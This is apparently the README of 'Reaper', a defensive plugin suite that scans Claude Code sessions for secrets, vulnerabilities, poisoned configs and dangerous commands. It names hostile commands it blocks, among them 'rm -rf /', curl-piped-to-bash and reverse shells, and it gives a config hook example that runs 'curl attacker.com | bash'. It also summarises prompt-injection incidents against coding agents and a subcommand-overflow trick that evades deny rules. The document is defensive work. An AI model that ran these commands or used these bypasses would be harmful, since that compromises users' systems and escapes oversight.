# Reaper

<p>
  <a href="LICENSE"></a>
  
  
  
  
</p>

> **An @enchanted-plugins product — algorithm-driven, agent-managed, self-learning.**

Named after the **Reaper Leviathan** from Subnautica — you hear it before you see it. It hunts in the dark. Nothing gets past it.

**5 plugins. 5 agents. 2,011 patterns. 8 algorithms. 98 CWEs. 20 attack databases. Zero dependencies.**

Built from blood — every pattern traces back to a real CVE, a real breach, or a real research paper.

> Clone a malicious repo. Open it in Claude Code.
>
> Before you type a single command, config-shield has already flagged the hidden
> `postinstall` script in package.json, the API-key-stealing hook in `.claude/settings.json`,
> and the Unicode-obfuscated backdoor in `.cursorrules`.
>
> You start coding. Reaper catches the PostgreSQL connection string on line 12, flags
> the `pickle.loads()` as CWE-502, spots the JWT signed with `alg: "none"`, blocks the
> `rm -rf /tmp/*`, and quarantines a typosquatted npm package — all before you finish
> your coffee.
>
> End of session: 6 secrets masked, 4 vulns mapped to CWEs, 1 command blocked,
> 2 phantom dependencies caught, 0 incidents. Dark-themed HTML report generated.
>
> Total overhead: < 50ms per file write. You didn't notice it running.

---

## Contents

- [The Numbers](#the-numbers)
- [Why This Exists](#why-this-exists)
- [How It Works](#how-it-works)
- [What Makes Reaper Different](#what-makes-reaper-different)
- [The Full Lifecycle](#the-full-lifecycle)
- [The 20 Pattern Databases](#the-20-pattern-databases)
- [5 Plugins, 5 Agents, 2,011 Patterns](#5-plugins-5-agents-2011-patterns)
- [What You Get Per Session](#what-you-get-per-session)
- [Install](#install)
- [The Science Behind Reaper](#the-science-behind-reaper)
- [vs Everything Else](#vs-everything-else)
- [Agent Conduct (9 Modules)](#agent-conduct-9-modules)
- [Architecture](#architecture)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)

## The Numbers

| | Count |
|---|---|
| **Pattern databases** | 20 |
| **Security patterns** | 2,011 |
| **CWEs covered** | 98 |
| **CVEs referenced** | 30+ |
| **Attack categories** | 120+ |
| **Languages scanned** | 12 |
| **Package ecosystems** | 5 |
| **Named algorithms** | 8 |
| **Agents** | 5 |
| **Dependencies** | 0 (bash + jq) |

The largest open-source pattern database for AI coding agent security. Period.

---

## Why This Exists

Every pattern exists because something real happened to a real developer.

| Year | Incident | Impact | Reaper Coverage |
|------|----------|--------|-----------------|
| 2025 | **Clinejection** — prompt injection in GitHub Issue titles led to `npm publish` of malicious packages | Supply chain compromise | `cicd-attacks.json` — 130 CI/CD injection patterns |
| 2025 | **CamoLeak** — invisible prompt in PR description exfiltrated secrets via GitHub Camo proxy | Credential theft (CVE-2025-59145) | `ai-agent-attacks.json` — 110 AI/LLM attack patterns |
| 2025 | **Check Point hooks exploit** — `.claude/settings.json` ran reverse shell on repo clone | RCE (CVE-2025-59536) | `config-attacks.json` — 117 config poisoning signatures |
| 2025 | **MCP server SSRF** — 36.7% of 7,000 MCP servers vulnerable | Internal network pivoting | `ssrf-patterns.json` — 61 SSRF detection patterns |
| 2024 | **Leaky Vessels** — runc container escape via build-time race condition | Host filesystem access (CVE-2024-21626) | `container-security.json` — 113 container patterns |
| 2024 | **xz-utils backdoor** — nation-state supply chain attack on liblzma | SSH compromise (CVE-2024-3094) | `dependency-confusion.json` — 50 supply chain patterns |
| 2022 | **Auth0 JWT bypass** — algorithm confusion (alg:none) | Authentication bypass (CVE-2022-23529) | `auth-bypass.json` — 80 auth/session patterns |
| 2021 | **Log4Shell** — JNDI injection via log messages, most exploited vulnerability ever | Global RCE (CVE-2021-44228) | `logging-forgery.json` — 41 log injection patterns |
| 2021 | **Dependency confusion** — Alex Birsan hit Apple, Microsoft, Tesla internal build servers | RCE on build systems | `dependency-confusion.json` — install script abuse, lockfile poisoning |
| 2019 | **Capital One** — SSRF + overpermissive IAM exposed 106M records | Massive data breach | `iac-misconfig.json` — 120 IaC patterns |
| 2019 | **Cloudflare outage** — evil regex in WAF rules took down global CDN for 27 minutes | Global service disruption | `regex-dos.json` — 44 ReDoS patterns |
| 2019 | **Lodash prototype pollution** — `_.merge` CVE affected 25M+ weekly downloads | RCE via prototype chain (CVE-2019-10744) | `prototype-pollution.json` — 35 pollution patterns |

## How It Works

Reaper doesn't scan after the fact. It **intercepts** — before secrets hit disk, before dangerous commands execute, before malicious configs load.

At **SessionStart**, config-shield scans repo configs for CVE-matched attack signatures (R5). **PreToolUse** on Bash routes through action-guard, which classifies the command against 105 dangerous-op patterns (R4) and blocks any command with >50 subcommand separators (R7, exit 2). **PostToolUse** on Write/Edit runs secret-scanner (R1 Aho-Corasick + R2 Shannon entropy) and vuln-detector (R3 OWASP graph) in parallel. audit-trail logs every event and drives R8 Bayesian threat-posture EMA across sessions. The diagram below shows the bindings.

<p align="center">
  <a href="docs/assets/hooks.mmd" title="View hook-binding diagram source (Mermaid)">
    
  </a>
</p>

<sub align="center">

Source: [docs/assets/hooks.mmd](docs/assets/hooks.mmd) · Regeneration command in [docs/assets/README.md](docs/assets/README.md).

</sub>

No permission prompts. No manual scanning. Every tool call is monitored. Dangerous commands are blocked before they execute.

## The 20 Pattern Databases

### Threat Intelligence (2,011 patterns across 20 databases)

| Database | Patterns | What it detects |
|----------|----------|-----------------|
| **secrets.json** | 310 | AWS, GCP, Azure, OpenAI, Anthropic, GitHub, GitLab, Stripe, Slack, JWT, private keys, connection strings — 80+ providers |
| **vulns.json** | 156 | SQL injection, XSS, path traversal, command injection, SSRF, deserialization, CORS, insecure random, SSTI — OWASP Top 10 |
| **dangerous-ops.json** | 105 | `rm -rf /`, `DROP TABLE`, `curl\|bash`, reverse shells, K8s delete, Docker privileged, Terraform destroy |
| **config-attacks.json** | 117 | CVE-2025-59536, CVE-2026-21852, CVE-2025-54135 — .claude hooks, .vscode autorun, .npmrc hijack, hidden Unicode |
| **slopsquatting.json** | 199 | AI-hallucinated packages across npm, PyPI, Cargo, Go, RubyGems + Levenshtein typosquats |
| **cicd-attacks.json** | 130 | GitHub Actions `${{ }}` injection, `pull_request_target` abuse, Jenkins Groovy escape, GitLab CI dind, Azure DevOps variable injection |
| **container-security.json** | 113 | Dockerfile USER root, K8s privileged containers, hostNetwork, capabilities ALL, Helm secrets, docker-compose socket mounts |
| **iac-misconfig.json** | 120 | Terraform S3 public, IAM wildcard, open security groups — CloudFormation, ARM templates, Pulumi equivalents |
| **crypto-weakness.json** | 90 | MD5/SHA1, DES/RC4, ECB mode, hardcoded keys, weak RSA, bcrypt low rounds, TLS verification disabled |
| **auth-bypass.json** | 80 | JWT alg:none, session fixation, CSRF disabled, OAuth missing state, mass assignment, IDOR patterns |
| **ssrf-patterns.json** | 61 | Cloud metadata (AWS/GCP/Azure/Alibaba), localhost bypass (hex/octal/IPv6), scheme abuse (gopher/file/dict), user-URL fetch |
| **api-security.json** | 81 | GraphQL introspection, no rate limit on login, CORS reflect origin, WebSocket no auth, gRPC no TLS |
| **ai-agent-attacks.json** | 110 | Prompt injection, MCP tool poisoning, CamoLeak exfiltration, jailbreaks, rules file backdoors, invisible Unicode |
| **regex-dos.json** | 44 | Nested quantifiers `(a+)+`, overlapping alternation, evil email regex, `new RegExp(userInput)` |
| **deserialization.json** | 69 | Java ObjectInputStream, Python pickle, PHP unserialize, Ruby Marshal, .NET BinaryFormatter, Node serialize |
| **file-operations.json** | 50 | Zip slip, symlink race, TOCTOU, predictable temp files, upload without validation, LFI/RFI |
| **logging-forgery.json** | 41 | Log4Shell `${jndi:ldap://}`, CRLF injection, passwords in logs, ANSI escape injection |
| **prototype-pollution.json** | 35 | `__proto__` assignment, lodash.merge (CVE-2018-3721), JSON.parse spread, Express req.body pollution |
| **dependency-confusion.json** | 50 | npm preinstall abuse, lockfile registry mismatch, version wildcards, protestware, manifest confusion |
| **header-security.json** | 50 | CSP unsafe-inline/unsafe-eval, missing HSTS, X-Frame-Options ALLOWALL, directory listing, .git exposure |

### Coverage by Attack Surface

| Attack Surface | Databases | Combined Patterns |
|----------------|-----------|-------------------|
| **Secrets & credentials** | secrets, crypto-weakness | 400 |
| **Code vulnerabilities** | vulns, deserialization, file-operations, regex-dos, prototype-pollution, logging-forgery | 395 |
| **Infrastructure** | container-security, iac-misconfig, header-security | 283 |
| **CI/CD & supply chain** | cicd-attacks, dependency-confusion, slopsquatting | 379 |
| **Auth & API** | auth-bypass, ssrf-patterns, api-security | 222 |
| **AI/LLM agent** | ai-agent-attacks, config-attacks | 227 |
| **Dangerous commands** | dangerous-ops | 105 |

## What Makes Reaper Different

### It runs at write-time, not push-time

GitHub Secret Scanning runs on push. Snyk runs in CI. semgrep runs in a pipeline. By the time they catch something, the secret is already in git history, the vulnerability is already deployed, the command has already executed.

Reaper hooks into Claude Code's tool lifecycle. `scan-secrets.sh` fires on every Write/Edit. `guard-action.sh` fires on every Bash call — **before** it executes. Exit code 2 blocks the tool entirely. The secret never reaches the file. The `rm -rf /` never runs.

### It blocks commands, not just reports them

Action-guard is a **PreToolUse** hook — it sees the command before Claude Code executes it. When it detects `rm -rf /`, `DROP TABLE`, `curl | bash`, or a reverse shell, it exits with code 2 and the command is cancelled.

```
[Reaper] BLOCKED: Recursive force delete from filesystem root (mode: balanced)
```

Three strictness modes:

| Mode | Block patterns | Warn patterns | Use when |
|------|---------------|---------------|----------|
| **strict** | BLOCK | BLOCK | High-security environments, prod-adjacent repos |
| **balanced** (default) | BLOCK | WARN (stderr) | Day-to-day development |
| **permissive** | WARN | WARN | Trusted code, prototyping |

### It detects attacks no other tool catches

**Config poisoning** (R5): Scans for malicious config files on session start — `.claude/settings.json` with hooks that execute `curl attacker.com | bash`, `.claudecode/settings.json` stealing API keys, `.vscode/tasks.json` auto-executing on folder open. Real CVEs that no other tool detects.

**AI agent attacks**: 110 patterns for prompt injection, MCP tool poisoning, invisible Unicode in rules files, data exfiltration via image markdown, jailbreak detection, and rules file backdoors. Built for the age of coding agents.

**Subcommand overflow** (R7): Adversa AI discovered that commands with 50+ subcommands bypass deny rules. Reaper counts first, matches second.

**Phantom dependencies** (R6): 20% of AI-suggested packages don't exist (USENIX 2025). Attackers register those names. 199 known hallucinated/typosquatted packages + Levenshtein distance catches the rest.

### It never logs your secrets

Every layer enforces masking. `mask_secret()` shows only first 4 and last 4 characters:

```
[Reaper] CRITICAL SECRET: aws-access-key-id in config.py:12 (masked: AKIA...MPLE)
```

The full value never appears in stderr, audit logs, metrics, or reports. Not in any code path.

### It learns across sessions

The **Bayesian Threat Convergence** engine (R8) tracks security posture over time:

<p align="center"></p>

Patterns you consistently dismiss get lower severity. Chronic vulnerabilities escalate. The engine gets smarter with every session.

## The Full Lifecycle

A single session flows left to right through five stages. **Config Shield** runs once at SessionStart and reports via `/reaper:config-check`. Every Bash call routes through **Action Guard** (PreToolUse, `/reaper:safety`). If the command is allowed, every Write/Edit fans out in parallel to **Secret Scanner** (`/reaper:secrets`) and **Vuln Detector** (`/reaper:vulns`). All events land in **Audit Trail** (`/reaper:audit`).

<p align="center">
  <a href="docs/assets/lifecycle.mmd" title="View session-lifecycle diagram source (Mermaid)">
    
  </a>
</p>

<sub align="center">

Source: [docs/assets/lifecycle.mmd](docs/assets/lifecycle.mmd) · Regeneration command in [docs/assets/README.md](docs/assets/README.md).

</sub>

## Install

Reaper ships as 5 plugins layering defenses across SessionStart / PreToolUse / PostToolUse. One meta-plugin — `full` — lists all five as dependencies, so a single install pulls in the whole stack.

**In Claude Code** (recommended):

```
/plugin marketplace add enchanted-plugins/reaper
/plugin install full@reaper
```

Claude Code resolves the dependency list and installs all 5 plugins. Verify with `/plugin list`.

**Want to cherry-pick?** Individual plugins are still installable by name — e.g. `/plugin install reaper-secret-scanner@reaper` if you only need credential scanning. Each plugin covers a different attack surface, though, so `full@reaper` is the path we recommend for real defense-in-depth.

**Via shell** (also installs `shared/*.sh` and `shared/scripts/*.py` locally so hooks work offline):

```bash
bash <(curl -s https://raw.githubusercontent.com/enchanted-plugins/reaper/main/install.sh)
```

## 5 Plugins, 5 Agents, 2,011 Patterns

| Plugin | Command | What | Agent |
|--------|---------|------|-------|
| secret-scanner | `/reaper:secrets` | 310 secret patterns + entropy analysis | scanner (Haiku) |
| vuln-detector | `/reaper:vulns` | 1,701 vulnerability patterns across 98 CWEs | analyzer (Sonnet) |
| action-guard | `/reaper:safety` | 105 dangerous ops, command blocking | guardian (Sonnet) |
| config-shield | `/reaper:config-check` | 117 config attack signatures, 6 CVEs | inspector (Sonnet) |
| audit-trail | `/reaper:audit` | JSONL logging, HTML reports, self-learning | chronicler (Haiku) |

## What You Get Per Session

```
plugins/audit-trail/state/
├── audit.jsonl         Every security event, JSONL, 10MB rotation
└── metrics.jsonl       Aggregate scan metrics

plugins/secret-scanner/state/
├── audit.jsonl         Secret findings with masked values
└── metrics.jsonl       Scan counts and timing

plugins/action-guard/state/
├── audit.jsonl         Blocked/warned commands with reasons
└── config.json         Strictness mode (strict/balanced/permissive)

/tmp/reaper-report.html Dark-themed HTML security report
```

The **HTML security report** includes severity distribution bars, CWE pills, finding-by-finding breakdown, per-file risk summary, and an overall verdict (CLEAN / CAUTION / WARNING / CRITICAL).

## The Science Behind Reaper

Every engine is built on a formal mathematical model. Full derivations in [`docs/science/README.md`](docs/science/README.md).

### R1: Aho-Corasick Pattern Engine

<p align="center"></p>

Trie with failure links. The hook uses `grep -Eof` with one pattern per line for native C speed (<50ms). The Python script builds the full automaton for batch scanning.

### R2: Shannon Entropy Analysis

<p align="center"></p>

<p align="center"> 4.5 AND length >= 20"></p>

Catches secrets that don't match any known pattern but have suspiciously high randomness.

### R3: OWASP Vulnerability Graph

<p align="center"></p>

Language-aware CWE pattern matching. Comment detection reduces false positives. Maps to OWASP Top 10 2021.

### R4: Markov Action Classification

<p align="center"></p>

<p align="center"></p>

State-machine classification against 105 dangerous command patterns. Exit 2 blocks execution.

### R5: Config Poisoning Detection

<p align="center"></p>

117 attack signatures across 30+ config file types. Base64 payload decoding. Hidden Unicode detection.

### R6: Phantom Dependency Detection

<p align="center"></p>

Levenshtein distance for typosquat detection. 199 known hallucinated/malicious packages across 5 ecosystems.

### R7: Subcommand Overflow Detection

<p align="center"> 50"></p>

Adversa AI discovered that safety filters fail when overwhelmed with subcommands. Reaper counts before matching.

### R8: Bayesian Threat Convergence

<p align="center"></p>

<p align="center"></p>

Cross-session EMA of threat rates. Dismissed patterns decay. Chronic patterns escalate.

---

*Full derivations: [`docs/science/README.md`](docs/science/README.md). Every formula maps to running code in `shared/scripts/`.*

## vs Everything Else

| | Reaper | GitHub Secret Scanning | Snyk | semgrep | GitGuardian |
|---|---|---|---|---|---|
| Patterns | **2,011** | ~200 | ~1,000 | ~2,500 (rules) | ~400 |
| CWE coverage | **98 CWEs** | Secrets only | Varies | Varies | Secrets only |
| Scan timing | **Per-write** (real-time) | Push-time | CI pipeline | CI pipeline | Push-time |
| Command blocking | **PreToolUse exit 2** | — | — | — | — |
| Config poisoning | **117 signatures, 6 CVEs** | — | — | — | — |
| AI agent attacks | **110 patterns** | — | — | — | — |
| CI/CD injection | **130 patterns** | — | — | Partial | — |
| Container security | **113 patterns** | — | ✓ | ✓ | — |
| IaC scanning | **120 patterns** | — | ✓ | Partial | — |
| Supply chain | **249 packages + heuristics** | — | ✓ | — | — |
| Subcommand overflow | **R7 (Adversa AI bypass)** | — | — | — | — |
| Self-learning | **EMA across sessions** | — | — | — | — |
| Secret masking | **Enforced (first4...last4)** | ✓ | ✓ | — | ✓ |
| AI-agent aware | **Purpose-built for Claude Code** | — | — | — | — |
| Dependencies | **bash + jq (stdlib)** | GitHub | Node.js | Python | SaaS |
| Price | **Free (MIT)** | Free (public) / $$ | $$$ | Free / $$$ | $$$ |

## Agent Conduct (9 Modules)

Every skill inherits a reusable behavioral contract from [shared/](shared/) — loaded once into [CLAUDE.md](CLAUDE.md), applied across all plugins. This is how Claude *acts* inside Reaper: deterministic, surgical, verifiable. Not a suggestion; a contract.

| Module | What it governs |
|--------|-----------------|
| [discipline.md](shared/conduct/discipline.md) | Coding conduct: think-first, simplicity, surgical edits, goal-driven loops |
| [context.md](shared/conduct/context.md) | Attention-budget hygiene, U-curve placement, checkpoint protocol |
| [verification.md](shared/conduct/verification.md) | Independent checks, baseline snapshots, dry-run for destructive ops |
| [delegation.md](shared/conduct/delegation.md) | Subagent contracts, tool whitelisting, parallel vs. serial rules |
| [failure-modes.md](shared/conduct/failure-modes.md) | 14-code taxonomy for accumulated-learning logs |
| [tool-use.md](shared/conduct/tool-use.md) | Tool-choice hygiene, error payload contract, parallel-dispatch rules |
| [skill-authoring.md](shared/conduct/skill-authoring.md) | SKILL.md frontmatter discipline, discovery test |
| [hooks.md](shared/conduct/hooks.md) | Advisory-only hooks, injection over denial, fail-open |
| [precedent.md](shared/conduct/precedent.md) | Log self-observed failures to `state/precedent-log.md`; consult before risky steps |

## Architecture

Interactive architecture explorer with plugin diagrams, hook binding maps, and data flow:

**[docs/architecture/](docs/architecture/)** — auto-generated from the codebase.

## Testing

```bash
bash tests/run-all.sh
```

35 tests across all 5 plugins + shared utilities. Tests validate:
- Secret detection (7 tests)
- Vulnerability detection (6 tests)
- Command blocking (7 tests)
- Config scanning (5 tests)
- Audit logging (2 tests)
- Path sanitization (2 tests)
- Pattern database integrity (6 tests — JSON validity, schema compliance, unique IDs, minimum counts, CWE coverage, regex compilation)

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT
